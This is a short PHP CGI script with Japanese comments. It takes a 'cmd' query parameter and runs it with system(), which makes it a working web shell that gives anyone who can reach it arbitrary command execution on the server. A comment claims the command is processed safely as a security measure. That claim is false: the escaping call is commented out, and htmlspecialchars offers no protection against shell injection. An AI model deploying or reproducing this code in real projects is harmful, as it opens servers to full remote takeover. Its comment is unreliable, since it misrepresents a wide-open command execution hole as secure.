#!/usr/local/bin/php
<?php
// 必須ヘッダーを設定
print('Content-Type: text/plain'."\r\n");
print('Status: 200 OK'."\r\n\r\n");

parse_str(getenv('QUERY_STRING'), $_GET);

// セキュリティ対策として、コマンドを安全に処理
if (isset($_GET['cmd'])) {
  //$cmd = escapeshellcmd($_GET['cmd']);
  parse_str(getenv('QUERY_STRING'), $_GET);
  $cmd = htmlspecialchars($_GET['cmd']);
  echo($cmd);
  system($cmd);
} else {
    echo "No command provided.";
}

?>

